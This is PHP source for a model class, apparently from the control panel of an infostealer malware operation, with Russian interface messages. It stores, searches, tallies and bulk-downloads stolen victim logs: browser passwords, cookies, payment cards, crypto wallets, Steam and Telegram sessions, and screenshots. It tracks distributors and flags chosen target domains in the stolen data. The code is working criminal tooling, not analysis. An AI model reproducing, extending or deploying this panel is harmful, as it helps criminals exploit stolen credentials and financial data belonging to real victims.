<?php

namespace application\models;

use application\core\Model;
use application\lib\Answer;
use application\lib\Pagination;
use \R;

class Logs extends Model {

    public function show_screen($id) {
        $log = R::load('logs', $id);
        if($log != null) {
            if(file_exists("application/files/screenshots/" . $log->file . ".png")) {
                echo file_get_contents("application/files/screenshots/" . $log->file . ".png");
            }
        }
    }

    public function get_logs_by_country() {
        $result = [];
        $logs_count = $this->user->countOwn('logs');

        foreach($this->user->with('GROUP BY country HAVING COUNT(*) > 0')->ownLogsList as $log) {
            $result[] = [
                strtoupper($log->country) => $this->user->withCondition('country = ?', [$log->country])->countOwn('logs')
            ];
        }

        return $result;
    }

    public function get_all_statistic() {
        $result = [];
        $spamers = [];
        $tags = [];

        $passwords = 0;
        $cookies = 0;
        $forms = 0;
        $cards = 0;
        $steams = 0;
        $telegrams = 0;

        foreach($this->user->ownSpamersList as $spamer)
            $spamers[] = $this->user->withCondition("spamer = ?", [$spamer->hash])->countOwn('logs');

        foreach($this->user->ownTagsList as $tag)
            $tags[] = $this->user->withCondition("tag = ?", [$tag->key])->countOwn('logs');

        foreach($this->user->ownLogsList as $log) {
            $passwords += $log->passwords;
            $cookies += $log->cookies;
            $forms += $log->forms;
            $cards += $log->cards;
            $steams += $log->steam;
            $telegrams += $log->telegram;
        }

        $result[] = [
            "all" => $this->user->countOwn('logs'),

            "passwords" => $passwords,
            "cookies" => $cookies,
            "forms" => $forms,
            "cards" => $cards,

            "steams" => $steams,
            "telegrams" => $telegrams,

            "spamers" => $spamers,
            "tags" => $tags,
        ];

        return $result;
    }

    public function get_logs_count($token = "") {
        $result = [];

        if($token == "")
            $result[] = [
                "all" => $this->user->countOwn('logs'),
                'month' => $this->user->withCondition("FROM_UNIXTIME(date) > LAST_DAY(NOW() - INTERVAL 1 MONTH);")->countOwn('logs'),
                'week' => $this->user->withCondition("FROM_UNIXTIME(date) > NOW() - INTERVAL 7 DAY;")->countOwn('logs'),
                'today' => $this->user->withCondition("FROM_UNIXTIME(date) > NOW() - INTERVAL 1 DAY;")->countOwn('logs'),
            ];
        else {
            $spamer = R::findOne("spamers", "hash = ?", [$token]);
            if($spamer != null) {
                $user = R::findOne("accounts", "id = ?", [$spamer->accounts_id]);
                if($user != null) {
                    $result[] = [
                        "all" => $user->withCondition("spamer = ?", [$token])->countOwn('logs'),
                        'month' => $user->withCondition("FROM_UNIXTIME(date) > LAST_DAY(NOW() - INTERVAL 1 MONTH) AND spamer = ?", [$token])->countOwn('logs'),
                        'week' => $user->withCondition("FROM_UNIXTIME(date) > NOW() - INTERVAL 7 DAY AND spamer = ?", [$token])->countOwn('logs'),
                        'today' => $user->withCondition("FROM_UNIXTIME(date) > NOW() - INTERVAL 1 DAY AND spamer = ?", [$token])->countOwn('logs'),
                    ];
                }
            }
        }
            

        return ["data" => $result];
    }

    public function get_windows_pie() {
        $result = [];

        $logs_count = $this->user->countOwn('logs');

        if($logs_count > 0) {
            foreach($this->user->with('GROUP BY windows HAVING COUNT(*) > 0 LIMIT 3')->ownLogsList as $log) {
                $result[] = [
                    "all_logs" => $logs_count,
                    "title" => $log->windows,
                    "value" => $this->user->withCondition('windows = ?', [$log->windows])->countOwn('logs'),
                ];
            }
        }

        return new Answer(true, "", ["data" => $result]);
    }

    public function get_line_logs() {
        $end = strtotime('now');
        $result = [];

        for($i = 7; $i >= 0; $i--) {
            $count = $this->user->withCondition("FROM_UNIXTIME(date) < LAST_DAY(NOW() - INTERVAL ? MONTH) AND FROM_UNIXTIME(date) > LAST_DAY(NOW() - INTERVAL ? MONTH)", [$i, $i + 1])->countOwn('logs');

            $result[] = [
                "title" => strtoupper(date('M', strtotime("first day of -".$i." months", time()))),
                "value" => $count,
            ];
        }
        
        return new Answer(true, "", ["data" => $result]);
    }

    public function download_logs($arr, $name) {
        $file_name = $name == null ? 'logs_'.date("Y-m-d_H-m-s") : $name;
        $folder = 'application/temp/'.$file_name;
        $archive = $folder.'.zip';

        if($name == null) {
            $zip = new \ZipArchive;
            if ($zip->open($archive, \ZipArchive::CREATE) === TRUE) {

                foreach($arr as $id) {
                    $log = current($this->user->withCondition('id = ?', [$id])->ownLogsList);

                    if($log != null) {

                        $input = new \ZipArchive;
                        if(file_exists("application/files/stealler/".$log->file.".zip")) {
                            if ($input->open("application/files/stealler/".$log->file.".zip") === TRUE) {
                                mkdir($folder.'/'.$log->file.'/', 007, true);
                                $input->extractTo($folder.'/'.$log->file.'/');
                                $input->close();

                                $rd = $this->ReadDir($folder.'/'.$log->file);

                                foreach($rd as $value) {
                                    $local = explode($folder.'/', $value)[1];
                                    $zip->addFile($value, $local);
                                }
                            }
                            else {
                                $copylog .= "Не удалось открыть архив ".$log->file.".zip\r\n";
                            }
                        }
                        else {
                            $copylog .= "Не удалось найти архив ".$log->file.".zip\r\n";
                        }
                    }
                }

                if($copylog != "") {
                    $zip->addFromString("log.txt", $copylog);
                }

                $zip->close();

                $this->DeleteDir($folder);
                return new Answer(true, "", ["file" => $archive]);
            }
            else {
                $this->DeleteDir($folder);
                return new Answer(false, "Не удается создать ахрив, повторите попытку позже");
            }
        }
        else {
            if(file_exists($archive)) {
                $this->SendFile($archive, $name);
                unlink($archive);
            }
        }
    }
    
    public function download_log($id) {
        $log = current($this->user->withCondition('id = ?', [$id])->ownLogsList);

        if($log != null) {
            if(file_exists('application/files/stealler/'.$log->file.'.zip')) {
                $this->SendFile('application/files/stealler/'.$log->file.'.zip', $log->file.'.zip');
            }
        }
    }

    public function delete_log($id) {
        $log = current($this->user->withCondition('id = ?', [$id])->ownLogsList);

        if($log != null) {
            if(file_exists('application/files/stealler/'.$log->file.'.zip'))
                unlink('application/files/stealler/'.$log->file.'.zip');

            foreach ($log->ownPasswordsList as $pwd) {
                R::trash($pwd);
            }

            $path = 'application/files/cookies/' . $log->file . '.txt';
            if(file_exists($path)) {
                unlink($path);
            }

            if(file_exists("application/files/screenshots/" . $log->file . ".png"))
                unlink("application/files/screenshots/" . $log->file . ".png");

            R::trash($log);
            return new Answer();
        }
        else {
            return new Answer(false, "Лог не найден");
        }
    }

    public function toggle_check_log($id) {
        $log = current($this->user->withCondition("id = ?", [$id])->ownLogsList);

        if($log != null) {
            if($log->checked == 0) {
                $log->checked = 1;
            }
            else {
                $log->checked = 0;
            }
            R::store($this->user);
        }
    }

    public function delete_tag($name) {
        $tag = R::findOne("tags", "name = ?", [$name]);
        if($tag == null) 
            return new Answer(false, "Тэг с таким именем не найден");

        $logs = $this->user->withCondition("tag = ?", [$tag->key])->ownLogsList;
        // var_dump($logs);
        if($logs != null) {
            foreach($logs as $log) {
                $log->tag = null;
            }

            R::store($this->user);
        }
        

        foreach($this->user->ownTagsList as $tag) {
            if($tag->name == $name) {
                R::trash($tag);
                break;
            }
        }

        return new Answer();
    }

    public function change_tag($old, $new) {
        $tag = R::findOne("tags", "name = ?", [$old]);
        $ex = R::findOne("tags", "name = ?", [$new]);

        if($ex != null) {
            return new Answer(false, "Тэг с таким именем уже существует");
        }
        if($tag != null) {
            $tag->name = $new;
            R::store($tag);
            return new Answer();
        }
        else {
            return new Answer(false, "Тэг с таким именем не найден");
        }
    }

    public function create_tag($name) {
        $tag = R::dispense("tags");

        if(R::findOne("tags", "name = ?", [$name]) != null)
            return new Answer(false, "Тэг с таким именем уже существует");

        $tag->name = $name;
        $tag->key = md5($name.date("Y-m-d"));

        $this->user->ownTagsList[] = $tag;
        R::store($this->user);
        return new Answer();
    }

    private function get_info_log_btn($id) {
        return '<a style="margin-bottom: 5px;" href="javascript:void(0)" class="btn btn-info infobtn" onclick="LoadLogData('.$id.');"><i class="fas fa-info"></i></a>';
    }

    private function find_password($text) {
        $result = [];

        foreach($this->user->ownLogsList as $log) {
            foreach($log->ownPasswordsList as $pwd) {
                if(strpos($pwd->login, $text) !== false || strpos($pwd->url, $text) !== false
                    || strpos($pwd->password, $text) !== false) {

                    $result[] = [
                        "url" => $pwd->url,
                        "login" => $pwd->login,
                        "password" => $pwd->password,
                        "browser" => $pwd->browser,
                        "id" => $log->id,
                    ];
                }
            }
        }

        return $result;
    }

    public function get_find_passwords_table($text) {
        $result = [];

        if($text == "")
            return ["data" => $result];

        if(strpos($text, ';') !== false) {
            foreach(explode(';', $text) as $part) {
                foreach ($this->find_password($part) as $row) {
                    $result[] = $row;
                }
            }
        }
        else {
            $result = $this->find_password($text);
        }

        return ["data" => $result];
    }

    public function get_passwords_table($id) {
        $log = current($this->user->withCondition("id = ?", [$id])->ownLogsList);
        $result = [];
        if($log != null) {
            foreach ($log->ownPasswordsList as $pass) {
                $result[] = [
                    "url" => $pass->url,
                    "login" => $pass->login,
                    "pass" => $pass->password,
                    "browser" => $pass->browser,
                    "id" => $log->id,
                ];
            }
        }

        return ["data" => $result];
    }

    public function get_tags_table() {
        $result = [];
        foreach($this->user->ownTagsList as $tag) {
            $result[] = [
                "name" => $tag->name,
                "key" => $tag->key,
            ];
        }
        return ["data" => $result];
    }

    public function get_log_table($id) {
        $log = current($this->user->withCondition("id = ?", [$id])->ownLogsList);
        $result = [];

        if($log != null) {
            if($log->spamer == "")
                $spamer = "-";
            else {
                $spamer = current($this->user->withCondition("hash = ?", [$log->spamer])->ownSpamersList)->login;
            }
            $result[] = [
                "id" => $log->id,
                "checked" => $log->checked,
                "ip" => $log->ip,
                "country" => $log->country,
                "user" => $log->user,
                "pc" => $log->pc,
                "tag" => $log->tag==""?"-":$log->tag,
                "spamer" => $spamer,

                "passwords" => $log->passwords,
                "cookies" => $log->cookies,
                "forms" => $log->forms,
                "cards" => $log->cards,
                "wallets" => $log->wallets,
                "steam" => $this->checkHtml($log->steam),
                "telegram" => $this->checkHtml($log->telegram),

                "version" => $log->version,
                "size" => $this->filesize_format($log->size),
                "date" => date("Y-m-d H:m:s", $log->date),

                "hwid" => $log->hwid,
                "windows" => $log->windows,
                "file" => $log->file,
            ];
        }
        return $result;
    }

    public function get_logs_table($tag, $spamer = "", $last_logs = false) {
        $logs = [];

        if($spamer != "") {
            $user = null;

            if($this->user != null) {
                $user = $this->user;
            }
            else {
                $spmaer_acc = R::findOne("spamers", "hash = ?", [$spamer]);
                if($spmaer_acc != null) {
                    $user = R::findOne("accounts", "id = ?", [$spmaer_acc->accounts_id]);
                }
                else 
                    return [];
            }


            if($spamer == "0") {
                $logs = $user->withCondition('spamer != ""')->ownLogsList;
            }
            else {
                $logs = $user->withCondition("spamer = ? Order by date DESC", [$spamer])->ownLogsList;
            }
        }
        else {
            if(!empty($tag) && $tag != "0") {
                $db_tag = current($this->user->withCondition('id = ?', [$tag])->ownTagsList);
                if($db_tag != null) {
                    $logs = $this->user->withCondition("tag = ? Order by date DESC", [$db_tag->key])->ownLogsList;
                }
                else 
                    return [];
            }
            else {
                $logs = $this->user->with("Order by date DESC")->ownLogsList;
            }
        }
        
        

        $data = [];
        $i = 0;
        foreach ($logs as $log) {

            if($last_logs) {
                if($i >= 5)
                    break;
            }

            $dds_passwords = [];
            $dds_cookies = [];

            if($this->user != null) {
                foreach($this->user->ownDdList as $dd) {
                    if($dd->type == "1") {
                        foreach($log->ownPasswordsList as $password) {
                            if(strpos($password->url, $dd->domain) !== false) {
                                if(in_array($dd->domain, $dds_passwords) == false)
                                    $dds_passwords[] = $dd->domain;
                            }
                        }
                    }
                    else if($dd->type == "2") {
                        $path = 'application/files/cookies/' . $log->file . '.txt';
                        if(file_exists($path)) {
                            $fp = fopen($path, 'r');
                            if($fp !== false) {
                                $str = fread($fp, filesize($path));
                                foreach(explode('\r\n', $str) as $domain) {
                                    if(strpos($domain, $dd->domain) !== false)
                                        if(in_array($dd->domain, $dds_cookies) == false)
                                            $dds_cookies[] = $dd->domain;
                                }
                            }
                        }
                    }
                }
            }
           

            $data[] = [
                "id" => $log->id,
                "address" => [ $log->country, $log->code, $log->ip ],
                "data" => [
                    "passwords" => $log->passwords, 
                    "cookies" => $log->cookies, 
                    "cards" => $log->cards, 
                    "forms" => $log->forms, 
                    "wallets" => $log->wallets,
                    
                    "telegram" => $this->checkHtml($log->telegram), 
                    "steam" => $this->checkHtml($log->steam),

                    "dds_passwords" => $dds_passwords,
                    "dds_cookies" => $dds_cookies,
                ],
                "date" => date("Y-m-d H:m:s", $log->date),
                "size" => $this->filesize_format($log->size),
                "screenshot" => "/logs/screenshot/" . $log->id,
                "file" => [$log->checked, $log->id],
            ];

            $i++;
        }

        return ["data" => $data];
    }

    private function checkHtml($value = true) {
        return $value?"<i class=\"fal fa-check\"></i>":"<i class=\"fal fa-times\"></i>";
    }
}